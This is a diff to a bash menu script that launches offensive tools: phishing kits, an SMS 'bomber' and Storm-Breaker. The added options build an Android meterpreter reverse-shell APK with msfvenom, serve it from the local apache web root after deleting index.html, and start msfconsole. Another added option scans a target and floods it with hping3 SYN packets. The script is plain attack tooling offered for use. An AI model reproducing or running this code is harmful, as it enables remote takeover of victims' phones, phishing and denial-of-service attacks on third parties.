@@ -7,6 +7,8 @@ echo "press 2 to start camphishing"
 echo "press 3 to start bombing"
 echo "press 4 to start zphishing"
 echo "press 5 to start stormbeaker"
+echo "press 6 to start Android-hac"
+echo "press 7 to start Dos-att"
 echo "press Q to exit"
 
 echo -n "choose ->"
@@ -50,6 +52,24 @@ sudo git clone https://github.com/ultrasecurity/Storm-Breaker
 cd Storm-Breaker/
 sudo python3 st.py
 
+elif [ $x == 6 ]; then
+echo "you selected 6th option"
+sudo service apache2 start
+cd /var/www/html
+sudo rm -rf index.html
+sudo touch execute.apk
+read -p "enter ip-address" ip
+echo "your ip ->" $ip
+echo "Note - open your ip address wherever you want and install the apk file. Run it and enjoy"
+sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=4444 -o execute.apk
+msfconsole
+
+elif [ $x == 7 ]; then
+echo "you selected 7th option"
+read -p "enter ip-address" ip
+echo "your ip ->" $ip
+sudo nmap $ip
+sudo hping3 -c 100 -d 100 -S -p 80 --flood $ip
 
 elif [ $x == 'Q' ]; then
 exit
@@ -58,4 +78,3 @@ else
  echo "wrong way"
 
  fi
-
